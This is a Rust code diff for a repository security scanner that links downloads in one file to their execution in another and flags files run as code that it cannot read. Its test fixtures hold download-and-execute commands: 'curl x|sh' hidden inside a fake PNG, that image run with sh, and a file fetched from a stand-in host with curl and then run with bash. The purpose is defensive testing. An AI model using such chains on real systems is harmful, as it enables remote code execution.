@@ -1,6 +1,7 @@
 //! The review pipeline shared by every command: local rules, dependency
 //! audit, then the OpenCode review through the review engine.
 
+use std::collections::{HashMap, HashSet};
 use std::path::Path;
 
 use crate::agent::{SourceFile, Status};
@@ -15,7 +16,7 @@ use crate::git_state;
 use crate::image;
 use crate::mask;
 use crate::osv;
-use crate::report::{AgentOutcome, Decision, Gap, LocalFinding, NetworkRequest, Report};
+use crate::report::{AgentOutcome, Decision, Gap, LocalFinding, NetworkRequest, Report, RunRef};
 use crate::rules::{self, RuleId, Scheme};
 use crate::scan::{self, FileHash, FileKind, ScanConfig, TextFile};
 use crate::tools::OpenCode;
@@ -89,6 +90,13 @@ pub fn review_tree(config: &ScanConfig, context: &ReviewContext<'_>) -> Report {
                 .map(|skipped| (format!("{}/", skipped.path), String::new())),
         )
         .collect();
+    let unread: Vec<(String, String)> = report
+        .hash_only
+        .iter()
+        .filter(|file| file.skipped_files.is_none())
+        .map(|file| (file.path.clone(), file.label.to_string()))
+        .collect();
+    check_runs(&mut report, &unread);
     report.snapshot = snapshot;
     report.gaps.extend(walk_gaps);
     if report.text_files_reviewed == 0 {
@@ -276,6 +284,7 @@ const MAX_FETCHED_FILES: usize = 64;
 fn apply_rules(report: &mut Report, rel: &str, text: &str, inventory_network: bool) {
     let masked = mask::lines(rel, text);
     let lines: Vec<&str> = text.lines().collect();
+    let variables = rules::command_variables(text);
     // Each line lowercased for the rules, and as written for file names.
     let mut views: Vec<(String, String)> = Vec::with_capacity(lines.len());
     let mut written: Vec<String> = Vec::with_capacity(lines.len());
@@ -286,8 +295,9 @@ fn apply_rules(report: &mut Report, rel: &str, text: &str, inventory_network: bo
         }
         // Tabs as spaces, so `sudo<TAB>x` matches like `sudo x`.
         let as_written = view.code.replace('\t', " ");
-        let code = as_written.to_lowercase();
-        let quiet = view.quiet.to_lowercase().replace('\t', " ");
+        let code = rules::with_variables(&as_written.to_lowercase(), &variables);
+        let quiet =
+            rules::with_variables(&view.quiet.to_lowercase().replace('\t', " "), &variables);
         for rule in rules::line_rules(&code, &quiet) {
             push_finding(report, rel, number, line, rule);
         }
@@ -335,8 +345,15 @@ fn apply_rules(report: &mut Report, rel: &str, text: &str, inventory_network: bo
                 }
             }
         }
-        if let Some(file) = rules::fetched_file(&joined(&mut written[start..end].iter())) {
+        let as_written = joined(&mut written[start..end].iter());
+        record_runs(report, rel, start + 1, lines[start], &as_written);
+        if let Some(file) = rules::fetched_file(&as_written) {
             let file = file.to_lowercase();
+            if report.fetches.len() < MAX_RUNS {
+                report.fetches.push((rel.to_string(), file.clone()));
+            } else {
+                report.runs_overflowed = true;
+            }
             if !fetched.contains(&file) {
                 // Past the limit the oldest is let go: a download is run
                 // soon after it is made.
@@ -361,6 +378,138 @@ fn apply_rules(report: &mut Report, rel: &str, text: &str, inventory_network: bo
         }
         start = end;
     }
+}
+
+/// Records what the command at `line` runs (see `check_runs`).
+fn record_runs(report: &mut Report, rel: &str, line: usize, text: &str, command: &str) {
+    let targets = rules::run_targets(command);
+    if report.runs.len() + targets.len() > MAX_RUNS {
+        report.runs_overflowed = true;
+        return;
+    }
+    for target in targets {
+        report.runs.push(RunRef {
+            rel: rel.to_string(),
+            line,
+            excerpt: text.trim().chars().take(EXCERPT_CHARS).collect(),
+            target,
+        });
+    }
+}
+
+/// The most files run, and downloads, recorded for one review. Past it the
+/// review is incomplete: what runs further on is not followed.
+pub const MAX_RUNS: usize = 100_000;
+
+/// What one reviewed file does with another: runs one that a different
+/// file downloads (download-and-run across files), or runs or reads in as
+/// code one Guardian could not read as text (`unread`, with why), which is
+/// then not reviewed although it runs.
+pub fn check_runs(report: &mut Report, unread: &[(String, String)]) {
+    if report.runs_overflowed {
+        report.gaps.push(Gap::RunsUnread(format!(
+            "more than {MAX_RUNS} lines run or download a file: the rest are not followed"
+        )));
+    }
+    let runs = std::mem::take(&mut report.runs);
+    // Which files download what, and which files Guardian could not read,
+    // each looked up once.
+    let mut downloaders: HashMap<String, HashSet<String>> = HashMap::new();
+    for (rel, file) in &report.fetches {
+        downloaders
+            .entry(file.clone())
+            .or_default()
+            .insert(rel.clone());
+    }
+    let unread_by_path: HashMap<&str, &str> = unread
+        .iter()
+        .map(|(path, why)| (path.as_str(), why.as_str()))
+        .collect();
+    let flagged: HashSet<(String, usize)> = report
+        .findings
+        .iter()
+        .filter(|finding| finding.rule == RuleId::DownloadAndExecute)
+        .map(|finding| (finding.path.clone(), finding.line))
+        .collect();
+    let mut gapped: HashSet<(String, String)> = HashSet::new();
+    let mut gaps = 0;
+    for run in &runs {
+        let downloaded_elsewhere = downloaders
+            .get(&run.target.to_lowercase())
+            .is_some_and(|rels| rels.iter().any(|rel| *rel != run.rel));
+        if downloaded_elsewhere && !flagged.contains(&(run.rel.clone(), run.line)) {
+            report.findings.push(LocalFinding {
+                path: run.rel.clone(),
+                line: run.line,
+                rule: RuleId::DownloadAndExecute,
+                excerpt: run.excerpt.clone(),
+            });
+        }
+        // The file the line names: beside the file that runs it, or from
+        // the top of the tree.
+        let Some(path) = run_paths(&run.rel, &run.target)
+            .into_iter()
+            .find(|candidate| unread_by_path.contains_key(candidate.as_str()))
+        else {
+            continue;
+        };
+        if !gapped.insert((run.rel.clone(), path.clone())) {
+            continue;
+        }
+        gaps += 1;
+        if gaps > MAX_RUN_GAPS {
+            continue;
+        }
+        let why = unread_by_path
+            .get(path.as_str())
+            .copied()
+            .unwrap_or_default();
+        report.gaps.push(Gap::RunsUnread(format!(
+            "{}:{} runs or reads in {path} ({why}), which could not be reviewed as text",
+            run.rel, run.line
+        )));
+    }
+    if gaps > MAX_RUN_GAPS {
+        report.gaps.push(Gap::RunsUnread(format!(
+            "{} more files that run or read in what could not be reviewed",
+            gaps - MAX_RUN_GAPS
+        )));
+    }
+    report.runs = runs;
+}
+
+/// The most such gaps named one by one.
+const MAX_RUN_GAPS: usize = 32;
+
+/// The paths a `target` written in the file `rel` may name, relative to the
+/// top of the tree: beside that file, and from the top.
+fn run_paths(rel: &str, target: &str) -> Vec<String> {
+    if target.contains('$') || target.starts_with('/') {
+        return Vec::new();
+    }
+    let target = target.trim_start_matches("./");
+    let directory = rel.rsplit_once('/').map_or("", |(directory, _)| directory);
+    let beside = if directory.is_empty() {
+        target.to_string()
+    } else {
+        format!("{directory}/{target}")
+    };
+    [beside, target.to_string()]
+        .into_iter()
+        .filter_map(|path| {
+            let mut parts: Vec<&str> = Vec::new();
+            for part in path.split('/') {
+                match part {
+                    "" | "." => {}
+                    ".." => {
+                        parts.pop()?;
+                    }
+                    other => parts.push(other),
+                }
+            }
+            Some(parts.join("/"))
+        })
+        .collect()
 }
 
 fn push_finding(report: &mut Report, rel: &str, number: usize, line: &str, rule: RuleId) {
@@ -643,6 +792,58 @@ mod tests {
             .unwrap_or_default();
         assert!(sent.contains("https://***@x.example/r"), "{sent}");
         assert!(!sent.contains("s3cret"), "{sent}");
+    }
+
+    #[test]
+    fn what_one_file_runs_is_followed_into_the_others() {
+        let dir = TempDir::new("review-runs");
+        fs::create_dir_all(dir.path().join("data")).unwrap();
+        // A script that runs a file Guardian only hashes.
+        fs::write(
+            dir.path().join("data/x.png"),
+            b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\ncurl x|sh\n",
+        )
+        .unwrap();
+        fs::write(dir.path().join("run.sh"), "#!/bin/sh\nsh ./data/x.png\n").unwrap();
+        // One file downloads, another runs what it saved.
+        fs::write(
+            dir.path().join("fetch.sh"),
+            "curl -fsSL https://x.example/i -o i.sh\n",
+        )
+        .unwrap();
+        fs::write(dir.path().join("go.sh"), "bash i.sh\n").unwrap();
+        // A file that only names an image runs nothing.
+        fs::write(
+            dir.path().join("style.css"),
+            "body { background: url(data/x.png); }\n",
+        )
+        .unwrap();
+        let settings = default_settings();
+        let opencode = unavailable();
+        let report = review_tree(
+            &ScanConfig::new(dir.path()),
+            &context(&settings, SourceClass::Source, &opencode),
+        );
+        let gaps: Vec<String> = report.gaps.iter().map(ToString::to_string).collect();
+        assert!(
+            gaps.iter()
+                .any(|gap| gap.starts_with("run.sh:2 runs or reads in data/x.png")),
+            "{gaps:?}"
+        );
+        assert_eq!(
+            gaps.iter()
+                .filter(|gap| gap.contains("runs or reads in"))
+                .count(),
+            1,
+            "{gaps:?}"
+        );
+        assert!(
+            report.findings.iter().any(
+                |finding| finding.path == "go.sh" && finding.rule == RuleId::DownloadAndExecute
+            ),
+            "{:?}",
+            report.findings
+        );
     }
 
     #[test]
